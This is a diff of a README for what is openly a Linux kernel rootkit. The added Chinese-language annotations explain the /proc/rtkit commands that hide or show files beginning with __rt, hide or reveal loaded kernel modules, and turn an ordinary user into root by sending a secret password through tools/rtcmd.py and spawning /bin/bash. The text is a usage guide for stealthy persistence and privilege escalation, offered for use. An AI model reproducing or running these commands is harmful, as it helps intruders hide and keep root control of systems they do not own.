@@ -11,8 +11,12 @@ Just `cat /proc/rtkit` to see available commands. You can use attached program t
 
 
 Examples:
-``echo -n thf >> /proc/rtkit``
+``echo -n thf >> /proc/rtkit`` （隐藏或显示__rt开头的文件）
 ``./rtcmd.py hp1337``
+``echo -n ms >> /proc/rtkit``  (显示隐藏的模块)
+``echo -n mh >> /proc/rtkit``  (同ms相反)
+注：rootkit内核模块加载后，运行tools/rtcmd.py mypenislong /bin/bash 可以将普通用户提权到root用户
+
 
 To gain root you should give "My Pen Is Long" command (popculture reference, without spaces, small letters) and then fork some shell from writing process. rtcmd.py does that for you if second parameter is specified.
 ``tools/rtcmd.py mypenislong /bin/bash``
